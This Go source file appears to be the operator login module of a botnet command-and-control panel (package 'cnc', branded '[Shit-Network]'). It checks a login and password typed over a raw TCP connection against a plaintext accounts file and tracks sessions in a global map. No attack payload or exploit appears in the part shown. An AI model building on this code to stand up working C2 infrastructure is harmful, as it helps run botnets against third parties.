package cnc

import (
	"bufio"
	"io/ioutil"
	"net"
	"net/textproto"
	"strings"

	"github.com/fatih/color"
)

type Session struct {
	Ip       string
	Login    string
	Password string
	Conn     net.Conn
	Allcount int
}

func NewSession(Login, Password string, Ip string, Conn net.Conn, Allcount int) *Session {

	return &Session{
		Ip:       Ip,
		Login:    Login,
		Password: Password,
		Conn:     Conn,
		Allcount: Allcount,
	}

}

var Live bool
var SessionList = make(map[net.Conn]*Session)
var Tempcount int

func LoginPage(conn net.Conn) {

	conn.Write([]byte(color.HiWhiteString("[Shit-Network]") + color.HiMagentaString(" Enter login: ")))

	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)
	login, err := tp.ReadLine()

	conn.Write([]byte((color.HiWhiteString("[Shit-Network]") + color.HiMagentaString(" Enter password: "))))

	reader = bufio.NewReader(conn)
	tp = textproto.NewReader(reader)
	password, err := tp.ReadLine()

	if err != nil {
		conn.Close()
		return
	}
	accs, _ := ioutil.ReadFile("./data/accounts.txt")

	for _, acc := range strings.Split(string(accs), "\n") {
		login := strings.ReplaceAll(string(login), " ", "")
		password := strings.ReplaceAll(string(password), " ", "")

		if strings.ReplaceAll(login+":"+password, "\n", "") == acc {

			if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
				Tempcount++
				sess := NewSession(login, password, addr.IP.String(), conn, Tempcount)
				SessionList[conn] = sess
				Live = true
				return
			}
		}
	}
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		sess := NewSession(login, password, addr.IP.String(), conn, Tempcount)
		SessionList[conn] = sess
	}
	Print(color.HiRedString("Access denied\n"), conn)
	DeadSession(conn)
	conn.Close()
	return

}

func DeadSession(conn net.Conn) {
	delete(SessionList, conn)
}
